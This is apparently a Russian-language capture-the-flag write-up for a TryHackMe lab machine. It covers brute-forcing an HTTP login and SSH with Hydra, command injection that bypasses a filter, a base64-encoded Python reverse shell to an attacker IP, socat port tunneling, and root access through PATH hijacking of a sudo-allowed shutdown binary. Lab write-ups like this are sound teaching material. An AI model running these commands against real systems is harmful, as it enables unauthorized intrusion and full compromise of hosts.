# Year of the Fox

:white_check_mark:  [**Enum4linux**](#enum4linux)

:white_check_mark: [**Hydra**](#hydra)

:white_check_mark: [**Command Injection(filtering)**](#command_njection_filtering)

:white_check_mark: [**Socat tunneling**](#socat_tunneling)

:white_check_mark: [**Shutdown**](#shutdown)

:white_check_mark: [**PATH**](#PATH)

___

## Enumeration
Сканируем ip командой:
```
nmap -sV -sV fox.thm
```

```
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX
```

При переходе на сайт, нас встречает панель авторизации. Попробуем найти данные.

<a name="enum4linux"></a>

## Samba
Используем enum4linux для перечисления самбы
```
enum4linux fox.thm
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/1.png)

Получаем имена двух пользователей: fox, rascal.

## Hydra

Сбрутим пароль для пользователя rascal:
```
hydra -l rascal -P /usr/share/wordlists/rockyou.txt -f fox.thm http-get -t 64
```

```
[80][http-get] host: fox.thm   login: rascal   password: <REDACTED>
```

<a name="command_njection_filtering"></a>

## Command Injection(filtering)

Проходим авторизацию и попадаем на страницу.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/3.png)

Мы имеем строку поиска файлов, найдем уязвимость. Запускаем Burp Suite и перехватываем запрос. В запросе фильруются специальные символы, кроме " **\\** ".

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/4.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/5.png)

Наш экплоит будет выглядеть так:
```
"\";command;\""
```

Команда обратной оболочки:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.235",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Заодируем команду в base64 и модифицируем эксплоит:
```
"\";echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOC42MS4yMzUiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc= | base64 -d | bash;\""
```

Получаем shell. Закидываем linpeas. Видим, что открыт локальный порт 22.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/6.png)

Закинем бинарник nmap и просканируем локальную сеть.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/7.png)

Это порт ssh.

Просмотрим конфиг sshd_config

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/8.png)

Пользователь fox имеет доступ к ssh.

<a name="socat_tunneling"></a>

## Socat tunneling
Закинем бинарник socat, чтобы перенаправить 22 порт на порт 5555:

```
./socat tcp-l:5555,fork,reuseaddr tcp:localhost:22
```

<a name="hydra"></a>

Теперь мы можем сбрутить пароль от ssh юзера fox:
```
hydra -l fox -P /usr/share/wordlists/rockyou.txt -s 5555 fox.thm ssh
```

```
[5555][ssh] host: fox.thm   login: fox   password: <REDACTED>
```

Подключаемся по ssh
```
ssh -p 5555 fox@fox.thm
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/9.png)

<a name="shutdown"></a>

## Priviledge Escalation

Просмотрим права командой: **sudo -l**.
```
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

Отправим файл shutdown и просмотрим с помощью strings.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/10.png)

Двоичный файл вызывает другой файл под названием **poweroff**.

Посмотрев на выводы команды sudo -l на своей машине и атакуемой, можно заметить отличия.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/11.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/12.png)

<a name="PATH"></a>

Эта машина не использует secure_path в конфигурации sudoers.

Обычно, когда мы вызываем команду sudo, она игнорирует стандартный PATH и вместо него использует безопасный PATH, определенный в /etc/sudoers. Это делает очень сложным выполнение эксплойтов для манипуляции PATH. Но на этой машине нет secure_path, а значит, мы должны иметь возможность использовать PATH для получения root.
```
cp /bin/bash /tmp/poweroff

chmod +x /tmp/poweroff

export PATH=/tmp:$PATH

sudo /usr/sbin/shutdown
```

Получаем root

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/13.png)

Флаг находится не здесь, найдем его командой:
```
find /home -group root -type f 2>/dev/null
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/14.png)